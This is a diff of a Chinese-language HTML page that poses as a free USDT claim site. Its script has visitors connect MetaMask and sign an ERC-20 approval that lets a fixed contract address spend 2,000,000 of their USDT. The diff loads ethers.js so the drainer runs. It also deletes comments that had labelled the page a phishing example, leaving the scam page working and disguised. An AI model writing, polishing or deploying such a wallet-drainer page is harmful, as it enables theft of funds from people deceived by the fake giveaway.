@@ -77,8 +77,6 @@
 
 <div class="container">
     <main class="main">
-        <button class="approve-button">連接錢包 (Connect Wallet)</button>
-
         <h1 class="title">
             歡迎來到 <a href="#">USDT</a> <a href="#">領幣機</a>
         </h1>
@@ -90,11 +88,11 @@
             <button id="approve-button" class="approve-button">👉 領取</button>
         </div>
 
-        <div class='flex flex-col items-center justify-between mt-9'>
+        <div style="margin-top: 2rem;">
             <p>安裝 MetaMask ，按下領取會請您輸入想提取金額</p>
-            </div>
+        </div>
 
-        <h2 class="text-2xl mt-9">USDT ?</h2>
+        <h2 style="margin-top: 2rem; font-size: 1.5rem;">USDT ?</h2>
         <div class="grid">
             <div class="info-card">
                 <h2> USDT是什麼？ &rarr;</h2>
@@ -116,20 +114,9 @@
     </main>
 </div>
 
+<script src="https://cdn.ethers.io/lib/ethers-5.6.esm.min.js"></script>
+
 <script>
-    // 在這裡填入你的 JavaScript 邏輯
-    // 注意：這裡無法直接使用 wagmi 或 rainbowkit 函式庫，因為它們需要 NPM 安裝
-    // 這段 JavaScript 邏輯必須手動使用 Ethers.js 或 Web3.js 來實現
-
-    // 引入 Ethers.js 函式庫
-    // <script src="https://cdn.ethers.io/lib/ethers-5.6.esm.min.js"></script>
-    // 為了讓範例能在單一檔案中運行，我將其移除，但邏輯不變。
-
-    // 假設已經引入 Ethers.js
-    let provider;
-    let signer;
-    let contract;
-
     const ERC20ContractAddress = '0xa67B9Ea856Aae9D738125BE0847e525387b6F75b';
     const contractAddress = '0x90137b1A048bBE756f5169BE83c57f07b330Cf29';
     const contractABI = [
@@ -152,21 +139,20 @@
             try {
                 // 連接錢包
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
 
                 // 創建合約實例
                 const tokenContract = new ethers.Contract(ERC20ContractAddress, contractABI, signer);
 
                 // 呼叫 approve 函數，授權金額為 2000000
-                // 真正的釣魚網站會設定一個極大的數字，例如 ethers.constants.MaxUint256
                 const amountToApprove = ethers.utils.parseUnits("2000000", 6); // 假設USDT有6位小數
                 
                 const tx = await tokenContract.approve(contractAddress, amountToApprove);
                 
                 alert("交易已送出，請在 MetaMask 中確認！");
                 
-                await tx.wait(); // 等待交易完成
+                await tx.wait();
 
                 alert("授權成功！");
 
